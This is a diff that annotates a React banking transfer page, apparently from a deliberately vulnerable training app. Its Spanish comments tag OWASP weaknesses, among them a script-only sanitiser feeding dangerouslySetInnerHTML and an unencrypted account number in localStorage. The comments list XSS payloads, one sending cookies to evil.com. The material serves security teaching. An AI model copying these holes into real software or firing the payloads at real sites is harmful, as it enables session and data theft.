@@ -1,13 +1,37 @@
+// src/pages/createTransaction.jsx
+/*
+  VULNERABILIDADES IMPLEMENTADAS:
+  - A02:2021 Cryptographic Failures: accountNumber en localStorage sin cifrar
+  - A03:2021 Injection (XSS): dangerouslySetInnerHTML con sanitización débil (solo quita <script>)
+  - A04:2021 Insecure Design: Sin rate limiting, permite transferencias rápidas múltiples
+  - A05:2021 Security Misconfiguration: URL hardcoded, sin validación de montos máximos
+  - A07:2021 Authentication Failures: Confía en localStorage para datos críticos
+  - A09:2021 Security Logging Failures: No registra transacciones creadas
+*/
 import React, { useState } from "react";
 import Header from "../components/header.jsx";
 import * as txService from "../services/transaction.service";
 import axios from "axios";
 
+// VULNERABLE A03:2021 - Injection (XSS - CRÍTICO)
+// stripScriptTags es INSUFICIENTE para prevenir XSS
+// Solo elimina etiquetas <script> pero permite otros vectores de ataque:
+// - <img src=x onerror="alert('XSS')">
+// - <svg onload="alert('XSS')">
+// - <iframe src="javascript:alert('XSS')">
+// - <a href="javascript:alert('XSS')">Click</a>
+// - <input onfocus="alert('XSS')" autofocus>
+// Debería usar DOMPurify.sanitize() en su lugar
 function stripScriptTags(html = "") {
   return html.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, "");
 }
 
 export default function CreateTransaction() {
+  // VULNERABLE A02:2021 - Cryptographic Failures (CRÍTICO)
+  // VULNERABLE A07:2021 - Identification and Authentication Failures
+  // accountNumber obtenido de localStorage sin cifrar
+  // localStorage es accesible por cualquier script en el dominio (XSS)
+  // No hay validación de que accountNumber sea válido o del usuario actual
   const myAccountNumber = localStorage.getItem("accountNumber") || "";
 
   const [receiverAccount, setReceiverAccount] = useState("");
@@ -21,6 +45,10 @@ export default function CreateTransaction() {
   const [showPreview, setShowPreview] = useState(false);
   const [errorFields, setErrorFields] = useState({});
 
+  // VULNERABLE A05:2021 - Security Misconfiguration
+  // URL del backend hardcoded en código fuente
+  // Debería usar variable de entorno (import.meta.env.VITE_API_URL)
+  // VULNERABLE A04: Sin rate limiting, permite validaciones masivas
   async function validateAccount(accountNum) {
     if (!accountNum || accountNum.length < 10) {
       setAccountValid(null);
@@ -30,20 +58,25 @@ export default function CreateTransaction() {
 
     setValidating(true);
     try {
+      // VULNERABLE A05: URL hardcoded
       const res = await axios.get(
         `http://localhost:4000/api/transactions/validate/${accountNum}`
       );
 
+      // VULNERABLE A09:2021 - Security Logging Failures
+      // console.log expone datos en producción
       console.log("✅ Respuesta completa:", res.data);
 
       if (res.data.valid === true) {
         setAccountValid(true);
+        // VULNERABLE A02: accountHolder (nombre de otro usuario) almacenado sin cifrar
         setAccountHolder(res.data.user?.name || "Usuario");
       } else {
         setAccountValid(false);
         setAccountHolder("");
       }
     } catch (err) {
+      // VULNERABLE A09: Error logging en consola (visible en producción)
       console.error("❌ Error validando cuenta:", err);
       setAccountValid(false);
       setAccountHolder("");
@@ -52,11 +85,16 @@ export default function CreateTransaction() {
     }
   }
 
+  // VULNERABLE A04:2021 - Insecure Design
+  // Debounce de 500ms permite múltiples requests en poco tiempo
+  // Sin límite de intentos de validación
   function handleReceiverChange(value) {
     setReceiverAccount(value);
     setAccountValid(null);
     setAccountHolder("");
 
+    // VULNERABLE A05: window.validateTimeout es variable global
+    // Puede ser manipulada desde consola del navegador
     clearTimeout(window.validateTimeout);
     window.validateTimeout = setTimeout(() => {
       validateAccount(value);
@@ -71,11 +109,21 @@ export default function CreateTransaction() {
     if (!amount?.toString().trim()) errors.amount = "Monto requerido";
     if (isNaN(Number(amount)) || Number(amount) <= 0)
       errors.amount = "El monto debe ser un número positivo";
+
+    // VULNERABLE A05:2021 - Security Misconfiguration
+    // Sin validación de monto máximo
+    // Permite transferencias de cantidades absurdas (ej: $999999999)
+    // Sin validación de límite diario de transferencias
+
     if (receiverAccount === myAccountNumber)
       errors.receiverAccount = "No puedes transferir a tu propia cuenta";
     return errors;
   }
 
+  // VULNERABLE A04:2021 - Insecure Design (CRÍTICO)
+  // Sin rate limiting: permite múltiples transferencias rápidas
+  // Sin confirmación adicional para montos grandes
+  // VULNERABLE A09: No registra transacciones creadas
   async function onSubmit(e) {
     e.preventDefault();
     setMsg(null);
@@ -85,16 +133,22 @@ export default function CreateTransaction() {
 
     setLoading(true);
     try {
+      // VULNERABLE A03: description enviado sin sanitizar al backend
+      // Permite SQL injection si el backend concatena (ver transaction.model.js)
       const res = await txService.create({
-        senderAccount: myAccountNumber,
+        senderAccount: myAccountNumber, // VULNERABLE A07: De localStorage
         receiverAccount: receiverAccount.trim(),
         amount: Number(amount),
-        description: description,
+        description: description, // VULNERABLE A03: Sin sanitizar
       });
+
+      // VULNERABLE A09: Transacción exitosa sin logging
+      // No registra: timestamp, monto, cuenta destino, IP
       setMsg({
         type: "success",
         text: `Transacción exitosa. Nuevo saldo: $${res.data.newBalance?.toFixed(2)}`,
       });
+
       setReceiverAccount("");
       setAmount("");
       setDescription("");
@@ -102,6 +156,7 @@ export default function CreateTransaction() {
       setAccountHolder("");
       setErrorFields({});
     } catch (err) {
+      // VULNERABLE A05: Expone error completo del backend
       const detail = err?.response?.data?.error || err?.message || String(err);
       setMsg({ type: "error", text: detail });
     } finally {
@@ -109,6 +164,7 @@ export default function CreateTransaction() {
     }
   }
 
+  // VULNERABLE A03: stripScriptTags es insuficiente
   const sanitized = stripScriptTags(description || "");
 
   return (
@@ -131,6 +187,7 @@ export default function CreateTransaction() {
               <label className="block text-sm font-medium text-gray-300 mb-2">
                 Cuenta Origen
               </label>
+              {/* VULNERABLE A02: Muestra accountNumber sin cifrar */}
               <input
                 type="text"
                 value={myAccountNumber}
@@ -166,6 +223,7 @@ export default function CreateTransaction() {
                 </p>
               )}
 
+              {/* VULNERABLE A02: Muestra nombre del titular sin cifrar */}
               {accountValid === true && accountHolder && (
                 <p className="text-green-400 text-xs mt-1">
                   ✓ Cuenta válida - Titular: {accountHolder}
@@ -199,6 +257,7 @@ export default function CreateTransaction() {
                   value={amount}
                   onChange={(e) => setAmount(e.target.value)}
                   placeholder="0.00"
+                  // VULNERABLE A05: Sin max attribute (permite montos absurdos)
                   className={`w-full pl-8 pr-4 py-2 bg-gray-900 border ${
                     errorFields.amount ? "border-red-500" : "border-gray-700"
                   } rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none text-gray-100`}
@@ -215,6 +274,7 @@ export default function CreateTransaction() {
               <label className="block text-sm font-medium text-gray-300 mb-2">
                 Descripción
               </label>
+              {/* VULNERABLE A03: textarea sin sanitización en tiempo real */}
               <textarea
                 value={description}
                 onChange={(e) => setDescription(e.target.value)}
@@ -222,6 +282,7 @@ export default function CreateTransaction() {
                 rows="4"
                 className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:outline-none text-gray-100 resize-none"
               />
+              {/* VULNERABLE A05: Mensaje engañoso - NO previene todos los XSS */}
               <p className="text-gray-500 text-xs mt-1">
                 Se permite HTML básico (sin scripts)
               </p>
@@ -254,6 +315,7 @@ export default function CreateTransaction() {
                   : "bg-green-900/20 text-green-400 border border-green-800"
               }`}
             >
+              {/* VULNERABLE A03: msg.text puede contener HTML del backend */}
               {msg.text}
             </div>
           )}
@@ -264,6 +326,7 @@ export default function CreateTransaction() {
         </footer>
       </main>
 
+      {/* VULNERABLE A03:2021 - Injection (XSS STORED - CRÍTICO) */}
       {showPreview && (
         <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
           <div className="bg-gray-900 border border-blue-500/50 rounded-xl shadow-2xl w-full max-w-2xl animate-fadeIn">
@@ -282,6 +345,10 @@ export default function CreateTransaction() {
             <div className="p-6">
               <div className="bg-gray-800 border border-gray-700 rounded-lg p-4 min-h-[150px] max-h-[400px] overflow-auto">
                 {sanitized ? (
+                  // ⚠️ VULNERABLE A03: dangerouslySetInnerHTML con sanitización débil
+                  // Permite XSS con payloads como:
+                  // <img src=x onerror="alert(localStorage.getItem('token'))">
+                  // <svg onload="fetch('https://evil.com?cookie='+document.cookie)">
                   <div
                     className="text-gray-200 prose prose-invert max-w-none"
                     dangerouslySetInnerHTML={{ __html: sanitized }}
@@ -293,6 +360,7 @@ export default function CreateTransaction() {
                 )}
               </div>
 
+              {/* VULNERABLE A05: Mensaje engañoso - solo elimina <script> */}
               <div className="mt-4 text-xs text-gray-500">
                 <strong>Nota:</strong> Los scripts han sido eliminados por
                 seguridad
